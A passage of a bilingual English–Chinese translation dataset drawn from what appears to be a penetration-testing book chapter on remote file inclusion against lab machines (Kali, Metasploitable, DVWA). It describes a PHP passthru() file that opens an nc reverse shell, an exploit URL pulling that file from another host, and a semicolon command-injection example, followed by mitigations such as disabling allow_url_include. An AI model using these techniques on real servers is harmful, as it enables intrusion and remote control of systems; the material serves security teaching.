  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们启用这两个函数，则可以使用本地文件包含漏洞进行远程文件包含。要退出当前操作，请使用*Ctrl *+ *X;*保存，请使用*Ctrl* + *Y*和*Enter*。保存文件后重新启动Web服务器，输入`sudo
    /etc/init.d/apache2 restart`。
- en: We learned about the local file inclusion vulnerabilities work. We used the
    five-spaces-back method to access the `passwd` file. In remote file inclusion,
    we're going to access a file that is located on a different server.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 我们了解了本地文件包含漏洞的工作原理。我们使用了五个空格后退的方法来访问`passwd`文件。在远程文件包含中，我们将访问位于不同服务器上的文件。
- en: 'Now we will be using a pen test on an actual web server in order to get access
    to the file that is stored. The file should either have an IP address or a domain
    name. We need to run this on a local server and store the file on the web server
    of the Kali machine using `10.0.2.15`, in our case. The file could be a web shell
    or payload. Now create a simple PHP file. We will be using the `passthru()` function,
    which will execute OS commands for Windows and Linux. Which commands are going
    to be executed completely depends on the web server that they will be executed
    on. Create a file called `reverse.txt` with following code:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们将在实际的Web服务器上进行渗透测试，以便访问存储的文件。该文件应该有一个IP地址或域名。我们需要在本地服务器上运行此操作，并使用`10.0.2.15`在Kali机器的Web服务器上存储文件，在我们的情况下。该文件可以是Web
    shell或有效载荷。现在创建一个简单的PHP文件。我们将使用`passthru()`函数，该函数将在Windows和Linux上执行OS命令。将要执行的命令完全取决于将要执行的Web服务器。创建一个名为`reverse.txt`的文件，其中包含以下代码：
- en: '[PRE7]'
  id: totrans-92
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: We will be using the `nc` command that was used for code execution vulnerability,
    which allowed us to get a connection or a reverse connection from our target.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用用于代码执行漏洞的`nc`命令，该命令允许我们从目标获取连接或反向连接。
- en: 'The code starts and ends with `<?php` and `?>` tags. The commands will be placed
    between the quotation marks. Since we are using the same `nc` command, it will
    reverse the connection of the computer. The next step is to store this file in
    a we server. If the target is a remote web server, then we should store the file
    with IP so that we access the file from the remote web server. We will access
    the file using a Metasploitable machine, which will access stored files on the
    Kali machine. This is possible since the files and the machines are on the same
    network. The current file starts with `/var/www/html`, so the file will be stored
    on Kali and not on Metasploitable. In order to reverse it, we will be saving the
    file as `.txt` and not `.php`. If we store the file as PHP, it is going to be
    executed on the Kali machine. As we know, we already have access to the Kali machine,
    and we need to get access to the file on Metasploitable. To do this, we will save
    the file as `reverse.txt` on the `localhost`, which is in, `/var/www/html` directory.
    The file is still stored on `localhost` and not Metasploitable, so it''s at `10.0.2.15`.
    To check the whether `reverse.txt` file is on `localhost`, type `localhost/reverse.txt` in
    the address bar and press *Enter*. The file will be displayed in the browser:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 代码以`<?php`和`?>`标签开始和结束。命令将放置在引号之间。由于我们使用的是相同的`nc`命令，它将反转计算机的连接。下一步是将该文件存储在Web服务器上。如果目标是远程Web服务器，我们应该使用IP来存储文件，以便从远程Web服务器访问该文件。我们将使用Metasploitable机器访问该文件，Metasploitable将访问存储在Kali机器上的文件。这是可能的，因为文件和机器在同一网络上。当前文件以`/var/www/html`开头，因此文件将存储在Kali上，而不是Metasploitable上。为了反向访问，我们将把文件保存为`.txt`而不是`.php`。如果我们将文件存储为PHP，它将在Kali机器上执行。如我们所知，我们已经能够访问Kali机器，并且需要访问Metasploitable上的文件。为此，我们将把文件保存为`reverse.txt`，并放置在`localhost`的`/var/www/html`目录中。该文件仍然存储在`localhost`而不是Metasploitable上，所以它位于`10.0.2.15`。要检查`reverse.txt`文件是否在`localhost`上，请在地址栏中输入`localhost/reverse.txt`并按*Enter*。该文件将在浏览器中显示：
- en: '![](assets/f33f8c90-c206-422d-8338-2e60d9e55956.png)'
  id: totrans-95
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/f33f8c90-c206-422d-8338-2e60d9e55956.png)'
- en: 'Before starting the remote inclusion, listen for the connections on Kali in
    the same way as  in the *Code execution vulnerabilities* section. Type the following
    `nc` command to listen for the connections:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 在开始远程包含之前，请像在*代码执行漏洞*部分那样，在Kali上监听连接。输入以下`nc`命令以监听连接：
- en: '[PRE8]'
  id: totrans-97
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'Now we should be listening for the connections, as shown in the following screenshot:'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们应该在监听连接，如下图所示：
- en: '![](assets/b9820fce-af6a-42ec-87a4-e482d3970bfe.png)'
  id: totrans-99
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b9820fce-af6a-42ec-87a4-e482d3970bfe.png)'
- en: 'Now, instead of including the file on the same server, we will include the
    remote file in the URL. The URL changes to `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=http://10.0.2.15/reverse.txt`
    as shown in the following screenshot:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们将不再将文件包含在同一服务器上，而是将远程文件包含在URL中。URL更改为`http://10.0.2.4/dvwa/vulnerabilities/fi/?page=http://10.0.2.15/reverse.txt`，如下图所示：
- en: '![](assets/317eb379-3fb3-464e-b372-98051963c1ac.png)'
  id: totrans-101
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/317eb379-3fb3-464e-b372-98051963c1ac.png)'
- en: 'If we now check the file, it will be executed on `10.0.2.15`, which is now
    going to give us a remote connection to a Metasploitable computer. Go back to
    the Terminal, and if we type `uname - a`, we will now get full access to the Metasploitable
    machine, as shown in the following screenshot:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们现在检查文件，它将在`10.0.2.15`上执行，这将为我们提供与Metasploitable计算机的远程连接。返回到终端，输入`uname -a`，我们将现在获得对Metasploitable机器的完全访问权限，如下图所示：
- en: '![](assets/82b27373-17e9-4fe2-ba90-47eec00d6294.png)'
  id: totrans-103
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/82b27373-17e9-4fe2-ba90-47eec00d6294.png)'
- en: We can also execute commands such as `ls` and `pwd` on the Metasploitable machine.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以在Metasploitable机器上执行诸如`ls`和`pwd`的命令。
- en: Basic mitigation
  id: totrans-105
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 基本缓解
- en: This section talks about the prevention of vulnerabilities. A lot of vulnerabilities
    exist because of the functionalities that they provide.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 本节讨论了漏洞的预防措施。许多漏洞的存在是由于它们提供的功能。
- en: For example, in the first section, *File upload vulnerabilities*, we talked
    about allowing the upload of any file extension. The ideal case is to check the
    file type, if a user is uploading a file; it should be an MP3 or a media file,
    not a PHP file or some executable code. We should never allow users to upload
    executables. Filters can be used to check the extension. The best way to do this
    is to check the file instead of just checking the extension, because files can
    bypass the extension check. Check the picture or the media instead of relying
    on the extension.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，在第一部分，*文件上传漏洞*，我们讨论了允许上传任何文件扩展名的情况。理想情况下是检查文件类型，如果用户上传的是文件，它应该是MP3或媒体文件，而不是PHP文件或可执行代码。我们永远不应允许用户上传可执行文件。可以使用过滤器检查扩展名。最好的方法是检查文件本身，而不仅仅是检查扩展名，因为文件可以绕过扩展名检查。检查图片或媒体文件，而不是依赖扩展名。
- en: In the second section, *Code execution vulnerabilities*, we explored how we
    can run any code on a target computer. We should avoid allowing users to run code
    on the server. Also, avoid functions such as `eval` and `passthru`, which allow
    users to run OS code on the server. If we have to use these functions, analyze
    the input before execution.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 在第二部分，*代码执行漏洞*，我们探讨了如何在目标计算机上运行任何代码。我们应该避免允许用户在服务器上运行代码。同时，也要避免使用`eval`和`passthru`等功能，这些功能允许用户在服务器上运行操作系统代码。如果必须使用这些功能，请在执行之前分析输入。
- en: 'Take a look at this, for example:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 比如看这个例子：
- en: '[PRE9]'
  id: totrans-110
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: Suppose we type an IP, `10.0.2.15`, and then add a semicolon, and a command, `ls-la`.
    The only problem is the web application accepts the information the way it is
    copied and run. When we execute the command, we will see the IP address first
    and then the `ls-la` command. In such cases, check the input that was entered.
    If we are expecting an IP address, we can use a regex. A regex is a rule that
    will ensure that the input conforms with the format `10.0.2.15`. If we enter any
    other input, the web application would reject it. We should also ensure that there
    are no semicolons or spaces, and that everything comes as one thing and gets executed.
    These are many secure ways of execution, but the best thing to do is avoid `eval`
    and `passthru` functions.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 假设我们输入一个IP地址，`10.0.2.15`，然后加上分号和命令`ls -la`。唯一的问题是，Web应用程序会按原样接受并运行这些信息。当我们执行命令时，我们将首先看到IP地址，然后是`ls
    -la`命令。在这种情况下，检查输入的内容。如果我们期望的是IP地址，可以使用正则表达式。正则表达式是一条规则，确保输入符合`10.0.2.15`的格式。如果输入任何其他内容，Web应用程序将拒绝它。我们还应该确保没有分号或空格，并且所有内容都是一体化的并得到执行。这些都是安全的执行方法，但最好的做法是避免使用`eval`和`passthru`函数。
- en: The third section was on file inclusion, which was further divided into local
    and remote file inclusion. Local file inclusion allowed us to include any file
    on the target system, and to read files that had been disclosed by a vulnerability.
    Remote file inclusion was also looked at, which allows us to include any file
    from a web server that has PHP shells and gain a connection to the target computer.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 第三部分讨论了文件包含问题，进一步分为本地和远程文件包含。本地文件包含允许我们包含目标系统上的任何文件，并读取由漏洞泄露的文件。我们还研究了远程文件包含，允许我们从拥有PHP
    Shell的Web服务器中包含任何文件，并获得与目标计算机的连接。
- en: We need to prevent remote file inclusion so that people cannot include files
    outside our server. We can enable this method using the `php.ini` file by disabling
    the `allow_url_fopen` and `allow_url_include` functions. To disable the functions,
    follow the steps used in the *Remote file inclusion using Metasploitable* section.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要防止远程文件包含，以确保人们无法包含我们服务器之外的文件。我们可以通过禁用`allow_url_fopen`和`allow_url_include`功能，在`php.ini`文件中启用此方法。要禁用这些功能，请按照*远程文件包含使用Metasploitable*部分中的步骤进行操作。
- en: 'Ensure that the settings for `allow_url_fopen` and `allow_url_include` are
    set to `Off`:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 确保`allow_url_fopen`和`allow_url_include`的设置为`Off`：
- en: '![](assets/b63661fe-bd6e-4a90-b5ec-ebd8211812f7.png)'
  id: totrans-115
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b63661fe-bd6e-4a90-b5ec-ebd8211812f7.png)'
- en: The other way to prevent these exploits is to use static file inclusion. So
    instead of using dynamic file inclusion, which we've seen, we can hardcode the
    files that we want to include in the code and not have to get them using `GET`
    or `POST`.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种防止这些漏洞的方法是使用静态文件包含。因此，取代使用我们已见过的动态文件包含，我们可以将希望包含的文件硬编码到代码中，而不需要通过`GET`或`POST`获取它们。
- en: 'For example, in the vulnerability cases, we used the `page` parameter with
    the `index.php` page. Now, the `index.php` page uses the `include` parameter or
    otherwise takes another page called `news.php`, which will be included in the
    `$_GET();` parameter in the code. The following screenshot explains the vulnerability:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，在漏洞案例中，我们使用了带有`page`参数的`index.php`页面。现在，`index.php`页面使用了`include`参数，或者另行调用一个名为`news.php`的页面，这个页面将被包含在代码中的`$_GET();`参数中。以下截图解释了该漏洞：
- en: '![](assets/466391a5-351b-4516-9d27-3c90331635d2.png)'
  id: totrans-118
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/466391a5-351b-4516-9d27-3c90331635d2.png)'
- en: The fundamental thing is to `include` files that come after the `page` parameter.
    The code will dynamically take the files that come after the `page` parameter
    in the URL and `include` everything from URL to the current page. In some cases,
    we tend to use the `POST` method, which will not get the same executions; however,
    in such cases, it's best to use a proxy, such as Burp Proxy. It will help us to
    make modifications and include the files that we want to display. By using this
    approach, we won't be able to manipulate anything inside the page that is included.
    To avoid hard code and prevent using a variable, simply provide the page that
    needs to be included. This will make the code look longer but the page will be
    much more secure.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 基本的操作是`include`在`page`参数之后的文件。代码会动态地获取URL中`page`参数之后的文件，并`include`从URL到当前页面的所有内容。在某些情况下，我们倾向于使用`POST`方法，这样不会执行相同的操作；然而，在这种情况下，最好使用代理，如Burp
    Proxy。它将帮助我们进行修改并包含我们希望展示的文件。通过这种方法，我们无法操作被包含页面内部的任何内容。为了避免硬编码并防止使用变量，只需提供需要包含的页面。这会使代码看起来更长，但页面会更加安全。
- en: 'The following screenshot shows us an easier way of hardcoding:'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图展示了更简单的硬编码方法：
- en: '![](assets/33dc1581-1f24-4138-a97d-ec31606b75b6.png)'
  id: totrans-121
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/33dc1581-1f24-4138-a97d-ec31606b75b6.png)'
- en: Summary
  id: totrans-122
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we learned about basic file uploads using file vulnerabilities.
    We also looked at how to execute OS code under code vulnerabilities. Furthermore,
    we learned about local and remote file inclusion using Metasploitable. Finally,
    we learned about the problem-solving takeaways that should be considered when
    working with these vulnerabilities. The next chapter will dive deep into SQL injection
    vulnerabilities.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们学习了如何使用文件漏洞进行基本的文件上传。我们还研究了如何在代码漏洞下执行操作系统代码。此外，我们学习了如何使用Metasploitable进行本地和远程文件包含。最后，我们了解了在处理这些漏洞时应考虑的解决方案要点。下一章将深入探讨SQL注入漏洞。
